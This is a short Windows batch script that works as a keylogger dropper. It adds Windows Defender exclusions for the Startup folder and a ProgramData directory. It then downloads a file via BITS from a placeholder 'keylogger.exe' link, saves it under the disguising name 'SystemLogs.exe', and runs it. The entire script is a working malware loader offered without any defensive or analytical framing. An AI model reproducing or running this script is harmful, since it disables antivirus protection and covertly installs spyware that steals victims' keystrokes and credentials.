@echo off
if not exist "C:\ProgramData\Data" mkdir C:\ProgramData\Data
powershell -Command Add-MpPreference -ExclusionPath '%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup'
powershell -Command Add-MpPreference -ExclusionPath "C:\ProgramData\Data"
powershell -Command Start-BitsTransfer -Priority foreground -Source "Online link to keylogger.exe" -Destination "C:\ProgramData\Data\SystemLogs.exe"
start C:\ProgramData\Data\SystemLogs.exe